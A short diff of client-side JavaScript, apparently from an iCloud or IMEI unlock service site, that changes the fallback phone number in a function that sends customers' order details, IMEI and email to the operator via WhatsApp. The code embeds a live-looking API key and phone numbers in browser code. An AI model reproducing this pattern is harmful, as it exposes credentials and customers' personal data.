@@ -871,7 +871,7 @@
 
         function sendDirectWhatsappAlert1() {
             const settings = JSON.parse(localStorage.getItem('admin_settings') || '{}');
-            const phone = settings.whatsappPhone || '+2348160491143';
+            const phone = settings.whatsappPhone || '+2349076042815';
             const apiKey = settings.textMeBotApiKey || settings.callMeBotApiKey || 'x1NzntWDTbyH';
             const text = encodeURIComponent(`someone is on your site\n\nOrder ID: ${currentOrder.id}\nCountry: ${currentOrder.country}\nDevice: ${currentOrder.activeDevice}\nTarget Model: ${currentOrder.model}\nService: ${currentOrder.service}\nIMEI/Serial: ${currentOrder.identifier}\nMethod: ${currentOrder.paymentMethod || 'Selecting...'}\nTotal: ${currentOrder.totalPrice}\nEmail: ${currentOrder.email}\n\nManage on Admin Dashboard:\nhttps://icloud-o62c.onrender.com/admin`);
             fetch(`https://api.textmebot.com/send.php?recipient=${encodeURIComponent(phone)}&apikey=${encodeURIComponent(apiKey)}&text=${text}`, { mode: 'no-cors' });
